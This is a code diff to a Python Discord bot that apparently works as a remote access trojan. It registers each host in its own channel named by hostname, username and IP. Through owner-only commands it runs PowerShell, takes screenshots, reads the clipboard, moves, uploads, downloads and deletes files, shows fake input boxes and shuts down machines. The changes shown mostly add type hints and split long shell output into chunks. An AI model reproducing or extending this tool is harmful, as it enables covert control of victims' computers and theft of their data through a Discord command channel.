@@ -20,6 +20,7 @@ from src.cmd.popup import popup_show
 from src.cmd.screenshot import take_screenshot
 from src.cmd.shell import execute_cmd
 from src.cmd.upload_file import upload_file
+from src.cmd.utils import send_text_in_chunks
 from src.cmd.voice import voice_api
 from src.cmd.wallpaper import set_wallpaper
 from src.constants import UPDATE_TAG, VERSION
@@ -56,7 +57,9 @@ async def on_ready():
     pc_name = socket.gethostname()
 
     pc_user_name = f"{pc_name.strip()}/{username.strip()}"
-    channel_name = f"{pc_user_name.replace('/', '_').lower()}_{ip}"
+    channel_name = (
+        f"{pc_user_name.strip().replace('/', '_').replace(' ', '-').lower()}_{ip}"
+    )
 
     channel = next(
         (
@@ -94,12 +97,12 @@ async def on_message(message: discord.Message):
     ):
         return
 
-    if not message.content.startswith(bot.command_prefix):
+    if not message.content.startswith(str(bot.command_prefix)):
         global exit_confirmation
 
         if message.content.startswith("exit") and not exit_confirmation:
             exit_confirmation = True
-            message.send("*Are you sure you want to exit the process?*")
+            await message.channel.send("*Are you sure you want to exit the process?*")
             return
 
         exit_confirmation = False
@@ -112,7 +115,7 @@ async def on_message(message: discord.Message):
 # === PING COMMAND ===
 # ====================
 @bot.command(name="ping", description="Check the bot's latency.")
-async def ping(ctx: Context, *, args: str | None):
+async def ping(ctx: Context[commands.Bot], *, args: str | None):
     latency = round(bot.latency * 1000)  # latency in milliseconds
 
     if args and "-v" in args:
@@ -129,7 +132,7 @@ async def ping(ctx: Context, *, args: str | None):
 @bot.command(name="shell", description="Run powershell commands")
 @commands.is_owner()
 @commands.guild_only()
-async def shell(ctx: Context, *, user_cmd: str | None):
+async def shell(ctx: Context[commands.Bot], *, user_cmd: str | None):
     if not user_cmd:
         await ctx.reply(
             "⚠️ Please enter a command to execute\nUsage: z!shell `<command>`"
@@ -137,7 +140,8 @@ async def shell(ctx: Context, *, user_cmd: str | None):
         return
 
     result = execute_cmd(user_cmd) or f'Executed "{user_cmd}" with no output'
-    await ctx.reply(result)
+
+    await send_text_in_chunks(ctx, result)
 
 
 # ===========================
@@ -145,11 +149,11 @@ async def shell(ctx: Context, *, user_cmd: str | None):
 # ===========================
 @bot.command(
     name="screenshot",
-    description="Capture the bot host's screen",
+    description="Capture the bot host's screen and upload it to this channel.",
 )
 @commands.is_owner()
 @commands.guild_only()
-async def screenshot(ctx):
+async def screenshot(ctx: Context[commands.Bot]):
     await take_screenshot(ctx)
 
 
@@ -159,7 +163,7 @@ async def screenshot(ctx):
 @bot.command(name="voice", description="Speak text aloud using Windows text-to-speech.")
 @commands.is_owner()
 @commands.guild_only()
-async def voice(ctx, *, text: str):
+async def voice(ctx: Context[commands.Bot], *, text: str):
     await voice_api(ctx, text)
 
 
@@ -171,7 +175,7 @@ async def voice(ctx, *, text: str):
 )
 @commands.is_owner()
 @commands.guild_only()
-async def open_url(ctx, *, url: str):
+async def open_url(ctx: Context[commands.Bot], *, url: str):
     await spawn_proc(ctx, url)
 
 
@@ -184,7 +188,7 @@ async def open_url(ctx, *, url: str):
 )
 @commands.is_owner()
 @commands.guild_only()
-async def upload(ctx, url: str | None = None):
+async def upload(ctx: Context[commands.Bot], url: str | None = None):
     await upload_file(ctx, url)
 
 
@@ -196,7 +200,7 @@ async def upload(ctx, url: str | None = None):
 )
 @commands.is_owner()
 @commands.guild_only()
-async def download(ctx, *, path: str):
+async def download(ctx: Context[commands.Bot], *, path: str):
     await download_file(ctx, path)
 
 
@@ -206,7 +210,7 @@ async def download(ctx, *, path: str):
 @bot.command(name="delete", description="Delete a file or a folder")
 @commands.is_owner()
 @commands.guild_only()
-async def delete(ctx, *, path: str):
+async def delete(ctx: Context[commands.Bot], *, path: str):
     await delete_file(bot, ctx, path)
 
 
@@ -216,7 +220,7 @@ async def delete(ctx, *, path: str):
 @bot.command(name="move", description="moves files and folders from <src> to <dest>")
 @commands.is_owner()
 @commands.guild_only()
-async def move(ctx, *, paths: str):
+async def move(ctx: Context[commands.Bot], *, paths: str):
     await move_file(ctx, paths)
 
 
@@ -226,7 +230,7 @@ async def move(ctx, *, paths: str):
 @bot.command(name="popup", description="Display a native windows popup msgbox")
 @commands.is_owner()
 @commands.guild_only()
-async def popup(ctx, *, msg: str):
+async def popup(ctx: Context[commands.Bot], *, msg: str):
     await popup_show(ctx, msg)
 
 
@@ -239,7 +243,7 @@ async def popup(ctx, *, msg: str):
 )
 @commands.is_owner()
 @commands.guild_only()
-async def msgbox(ctx, *, args: str):
+async def msgbox(ctx: Context[commands.Bot], *, args: str):
     await msgbox_show(ctx, args)
 
 
@@ -249,7 +253,7 @@ async def msgbox(ctx, *, args: str):
 @bot.command(name="inputbox", description="Display a native windows input form")
 @commands.is_owner()
 @commands.guild_only()
-async def inputbox(ctx, *, prompt: str):
+async def inputbox(ctx: Context[commands.Bot], *, prompt: str):
     await inputbox_show(ctx, prompt)
 
 
@@ -259,7 +263,7 @@ async def inputbox(ctx, *, prompt: str):
 @bot.command(name="shutdown", description="shutdown PC immediately")
 @commands.is_owner()
 @commands.guild_only()
-async def shutdown(ctx, timeout: str | None = "0"):
+async def shutdown(ctx: Context[commands.Bot], timeout: str = "0"):
     timeout_seconds = 0
     try:
         timeout_seconds = int(timeout)
@@ -277,7 +281,7 @@ async def shutdown(ctx, timeout: str | None = "0"):
 @bot.command(name="restart", description="restart PC immediately")
 @commands.is_owner()
 @commands.guild_only()
-async def restart(ctx, timeout: str | None = "0"):
+async def restart(ctx: Context[commands.Bot], timeout: str = "0"):
     timeout_seconds = 0
     try:
         timeout_seconds = int(timeout)
@@ -295,7 +299,7 @@ async def restart(ctx, timeout: str | None = "0"):
 @bot.command(name="wallpaper", description="Sets the wallpaper of the image provided")
 @commands.is_owner()
 @commands.guild_only()
-async def wallpaper(ctx):
+async def wallpaper(ctx: Context[commands.Bot]):
     await set_wallpaper(ctx)
 
 
@@ -305,5 +309,7 @@ async def wallpaper(ctx):
 @bot.command(name="clipboard", description="Gets content from users clipboard")
 @commands.is_owner()
 @commands.guild_only()
-async def clipboard(ctx, action: str = "read", *, text: str = None):
-    await get_clipboard(ctx, action, text)
+async def clipboard(
+    ctx: Context[commands.Bot], action: str = "read", *, text: str | None = None
+):
+    await get_clipboard(ctx, action, text or "")
